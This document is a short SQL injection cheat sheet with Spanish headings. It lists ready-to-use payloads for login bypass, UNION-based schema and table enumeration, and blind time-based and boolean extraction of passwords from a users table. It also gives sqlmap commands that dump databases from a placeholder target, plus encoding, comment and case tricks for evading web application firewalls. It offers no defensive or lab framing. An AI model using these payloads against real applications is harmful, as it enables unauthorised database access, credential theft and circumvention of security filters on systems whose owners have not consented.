# SQL INJECTION CHEATSHEET

## 1. Payloads Básicos

```sql
-- Classic
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
' UNION SELECT NULL--

-- Union Based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Error Based
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
```

## 2. Extraer Información

```sql
-- Versión
' UNION SELECT @@version--
' UNION SELECT version()--

-- Bases de datos
' UNION SELECT database()--
' UNION SELECT schema_name FROM information_schema.schemata--

-- Tablas
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database'--

-- Columnas
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

## 3. Blind SQL Injection

```sql
-- Time-based
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

-- Boolean-based
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
```

## 4. Herramientas

```bash
# sqlmap
sqlmap -u "http://target.com?id=1" --batch --level=2 --risk=2

# sqlmap con payloads personalizados
sqlmap -u "http://target.com?id=1" --tamper=space2comment,space2tab

# Extraer datos
sqlmap -u "http://target.com?id=1" --dump --dbms=mysql
```

## 5. Evasión de WAF

```sql
-- Encoding
%27%20OR%20%271%27%3D%271
%53%45%4C%45%43%54%20

-- Comments
/**/SELECT/**/ * /**/FROM/**/users
SELECT/*!*/ * FROM users

-- Case Variation
sElEcT * FrOm UsErS
SeLeCt * FrOm UsErS
```
